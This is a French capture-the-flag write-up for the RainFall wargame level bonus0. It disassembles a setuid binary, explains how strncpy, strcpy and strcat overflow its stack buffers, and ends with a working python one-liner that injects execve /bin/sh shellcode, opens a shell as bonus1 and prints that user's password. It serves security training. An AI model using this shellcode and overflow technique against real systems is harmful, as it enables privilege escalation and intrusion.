# 10 - Stack buffer overflow 2

- On se connecte en tant que bonus0:
```
RELRO           STACK CANARY      NX            PIE             RPATH      RUNPATH      FILE
No RELRO        No canary found   NX disabled   No PIE          No RPATH   No RUNPATH   /home/user/bonus0/bonus0
```

```
bonus0@RainFall:~$ ls -l
total 8
-rwsr-s---+ 1 bonus1 users 5566 Mar  6  2016 bonus0
bonus0@RainFall:~$ gdb bonus0
```

```
Dump of assembler code for function main:
   0x080485a4 <+0>:     push   %ebp
   0x080485a5 <+1>:     mov    %esp,%ebp
   0x080485a7 <+3>:     and    $0xfffffff0,%esp
   0x080485aa <+6>:     sub    $0x40,%esp
   0x080485ad <+9>:     lea    0x16(%esp),%eax
   0x080485b1 <+13>:    mov    %eax,(%esp)
   0x080485b4 <+16>:    call   0x804851e <pp>
   0x080485b9 <+21>:    lea    0x16(%esp),%eax
   0x080485bd <+25>:    mov    %eax,(%esp)
   0x080485c0 <+28>:    call   0x80483b0 <puts@plt>
   0x080485c5 <+33>:    mov    $0x0,%eax
   0x080485ca <+38>:    leave  
   0x080485cb <+39>:    ret    
End of assembler dump.
```

```
Dump of assembler code for function pp:
   0x0804851e <+0>:     push   ebp
   0x0804851f <+1>:     mov    ebp,esp
   0x08048521 <+3>:     push   edi
   0x08048522 <+4>:     push   ebx
   0x08048523 <+5>:     sub    esp,0x50
   0x08048526 <+8>:     mov    DWORD PTR [esp+0x4],0x80486a0
   0x0804852e <+16>:    lea    eax,[ebp-0x30]
   0x08048531 <+19>:    mov    DWORD PTR [esp],eax
   0x08048534 <+22>:    call   0x80484b4 <p>
   0x08048539 <+27>:    mov    DWORD PTR [esp+0x4],0x80486a0
   0x08048541 <+35>:    lea    eax,[ebp-0x1c]
   0x08048544 <+38>:    mov    DWORD PTR [esp],eax
   0x08048547 <+41>:    call   0x80484b4 <p>
   0x0804854c <+46>:    lea    eax,[ebp-0x30]
   0x0804854f <+49>:    mov    DWORD PTR [esp+0x4],eax
   0x08048553 <+53>:    mov    eax,DWORD PTR [ebp+0x8]
   0x08048556 <+56>:    mov    DWORD PTR [esp],eax
   0x08048559 <+59>:    call   0x80483a0 <strcpy@plt>
   0x0804855e <+64>:    mov    ebx,0x80486a4
   0x08048563 <+69>:    mov    eax,DWORD PTR [ebp+0x8]
   0x08048566 <+72>:    mov    DWORD PTR [ebp-0x3c],0xffffffff
   0x0804856d <+79>:    mov    edx,eax
   0x0804856f <+81>:    mov    eax,0x0
   0x08048574 <+86>:    mov    ecx,DWORD PTR [ebp-0x3c]
   0x08048577 <+89>:    mov    edi,edx
   0x08048579 <+91>:    repnz scas al,BYTE PTR es:[edi]
   0x0804857b <+93>:    mov    eax,ecx
   0x0804857d <+95>:    not    eax
   0x0804857f <+97>:    sub    eax,0x1
   0x08048582 <+100>:   add    eax,DWORD PTR [ebp+0x8]
   0x08048585 <+103>:   movzx  edx,WORD PTR [ebx]
   0x08048588 <+106>:   mov    WORD PTR [eax],dx
   0x0804858b <+109>:   lea    eax,[ebp-0x1c]
   0x0804858e <+112>:   mov    DWORD PTR [esp+0x4],eax
   0x08048592 <+116>:   mov    eax,DWORD PTR [ebp+0x8]
   0x08048595 <+119>:   mov    DWORD PTR [esp],eax
   0x08048598 <+122>:   call   0x8048390 <strcat@plt>
   0x0804859d <+127>:   add    esp,0x50
   0x080485a0 <+130>:   pop    ebx
   0x080485a1 <+131>:   pop    edi
   0x080485a2 <+132>:   pop    ebp
   0x080485a3 <+133>:   ret
End of assembler dump.
```

```
Dump of assembler code for function p:
   0x080484b4 <+0>:     push   ebp
   0x080484b5 <+1>:     mov    ebp,esp
   0x080484b7 <+3>:     sub    esp,0x1018
   0x080484bd <+9>:     mov    eax,DWORD PTR [ebp+0xc]
   0x080484c0 <+12>:    mov    DWORD PTR [esp],eax
   0x080484c3 <+15>:    call   0x80483b0 <puts@plt>
   0x080484c8 <+20>:    mov    DWORD PTR [esp+0x8],0x1000
   0x080484d0 <+28>:    lea    eax,[ebp-0x1008]
   0x080484d6 <+34>:    mov    DWORD PTR [esp+0x4],eax
   0x080484da <+38>:    mov    DWORD PTR [esp],0x0
   0x080484e1 <+45>:    call   0x8048380 <read@plt>
   0x080484e6 <+50>:    mov    DWORD PTR [esp+0x4],0xa
   0x080484ee <+58>:    lea    eax,[ebp-0x1008]
   0x080484f4 <+64>:    mov    DWORD PTR [esp],eax
   0x080484f7 <+67>:    call   0x80483d0 <strchr@plt>
   0x080484fc <+72>:    mov    BYTE PTR [eax],0x0
   0x080484ff <+75>:    lea    eax,[ebp-0x1008]
   0x08048505 <+81>:    mov    DWORD PTR [esp+0x8],0x14
   0x0804850d <+89>:    mov    DWORD PTR [esp+0x4],eax
   0x08048511 <+93>:    mov    eax,DWORD PTR [ebp+0x8]
   0x08048514 <+96>:    mov    DWORD PTR [esp],eax
   0x08048517 <+99>:    call   0x80483f0 <strncpy@plt>
   0x0804851c <+104>:   leave
   0x0804851d <+105>:   ret
End of assembler dump.
```

- Voyons les parties les plus importantes du programme:
```
   0x080485aa <+6>:     sub    $0x40,%esp
   0x080485ad <+9>:     lea    0x16(%esp),%eax
   0x080485b1 <+13>:    mov    %eax,(%esp)
   0x080485b4 <+16>:    call   0x804851e <pp>
```
> La fonction `<pp>` est appelée avec une adresse située en `0x16(%esp)`.

```
   0x08048526 <+8>:     mov    DWORD PTR [esp+0x4],0x80486a0
   0x0804852e <+16>:    lea    eax,[ebp-0x30]
   0x08048531 <+19>:    mov    DWORD PTR [esp],eax
   0x08048534 <+22>:    call   0x80484b4 <p>
   0x08048539 <+27>:    mov    DWORD PTR [esp+0x4],0x80486a0
   0x08048541 <+35>:    lea    eax,[ebp-0x1c]
   0x08048544 <+38>:    mov    DWORD PTR [esp],eax
   0x08048547 <+41>:    call   0x80484b4 <p>
```
> La fonction `<p>` est appelée deux fois, chaque fois avec une adresse de la stack.

```
   0x080484c8 <+20>:    mov    DWORD PTR [esp+0x8],0x1000
   0x080484d0 <+28>:    lea    eax,[ebp-0x1008]
   0x080484d6 <+34>:    mov    DWORD PTR [esp+0x4],eax
   0x080484da <+38>:    mov    DWORD PTR [esp],0x0
   0x080484e1 <+45>:    call   0x8048380 <read@plt>
```

```
   0x080484ff <+75>:    lea    eax,[ebp-0x1008]
   0x08048505 <+81>:    mov    DWORD PTR [esp+0x8],0x14
   0x0804850d <+89>:    mov    DWORD PTR [esp+0x4],eax
   0x08048511 <+93>:    mov    eax,DWORD PTR [ebp+0x8]
   0x08048514 <+96>:    mov    DWORD PTR [esp],eax
   0x08048517 <+99>:    call   0x80483f0 <strncpy@plt>
```
> La fonction `<p>` lit 4096 depuis stdin, et copie les 20 premiers octets de ce buffer à l'adresse fournie en argument.

```
   0x0804854c <+46>:    lea    eax,[ebp-0x30]
   0x0804854f <+49>:    mov    DWORD PTR [esp+0x4],eax
   0x08048553 <+53>:    mov    eax,DWORD PTR [ebp+0x8]
   0x08048556 <+56>:    mov    DWORD PTR [esp],eax
   0x08048559 <+59>:    call   0x80483a0 <strcpy@plt>
```

```
   0x0804858b <+109>:   lea    eax,[ebp-0x1c]
   0x0804858e <+112>:   mov    DWORD PTR [esp+0x4],eax
   0x08048592 <+116>:   mov    eax,DWORD PTR [ebp+0x8]
   0x08048595 <+119>:   mov    DWORD PTR [esp],eax
   0x08048598 <+122>:   call   0x8048390 <strcat@plt>
```
>Nos buffers sont copiés à l'adresse fournie en argument de la fonction `<pp>`.

- Nous placerons donc les 20 premiers octets de notre shellcode dans le premier buffer et le reste dans le second buffer, suivi de l'adresse du début de notre shellcode.
```
bonus0@RainFall:~$ (python -c "print('\x90\x90\x90\x90\x90\x90\x90\x31\xf6\x31\xff\x31\xc9\x31\xd2\x52\x68\x2f\x2f\x73')"; python -c "print('\x68\x68\x2f\x62\x69\x6e\x89\xe3\x31\xc0\xb0\x0b\xcd\x80' + '\x36\xf7\xff\xbf' + 'a')"; cat) | ./bonus0

$ whoami
bonus1

$ cat /home/user/bonus1/.pass
cd1f77a585965341c37a1774a1d1686326e1fc53aaa5459c840409d4d06523c9&
```
